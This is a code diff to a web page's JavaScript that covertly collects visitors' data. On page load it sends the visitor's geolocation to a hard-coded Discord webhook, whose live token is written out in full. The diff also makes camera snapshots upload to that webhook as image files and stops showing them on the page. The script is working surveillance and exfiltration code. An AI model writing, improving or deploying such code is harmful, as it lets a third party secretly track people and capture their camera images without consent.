@@ -11,6 +11,7 @@
     <script>
       const takePictureButton = document.getElementById('take-picture');
       const pictureContainer = document.getElementById('picture-container');
+      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
 
       // Request the user's location
       if (navigator.geolocation) {
@@ -19,7 +20,6 @@
           const lon = position.coords.longitude;
 
           // Send the user's location to the Discord webhook
-          const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
           const formData = new FormData();
           formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
 
@@ -27,9 +27,9 @@
             method: 'POST',
             body: formData,
           })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
         });
       } else {
         console.error('Geolocation is not supported by this browser.');
@@ -50,13 +50,9 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
           const imageData = canvas.toDataURL('image/jpeg');
-          const image = document.createElement('img');
-          image.src = imageData;
-          pictureContainer.appendChild(image);
-
-          // Send the image to the Discord webhook
+          const blob = await fetch(imageData).then(response => response.blob());
           const formData = new FormData();
-          formData.append('file', imageData);
+          formData.append('file', blob, 'image.jpg');
           formData.append('username', 'Kamera Erişimi');
           formData.append('content', 'Resim Çekildi!');
 
@@ -64,9 +60,9 @@
             method: 'POST',
             body: formData,
           })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
+         .then(response => response.json())
+         .then(data => console.log(data))
+         .catch(error => console.error(error));
         } catch (error) {
           console.error('Error:', error);
         }
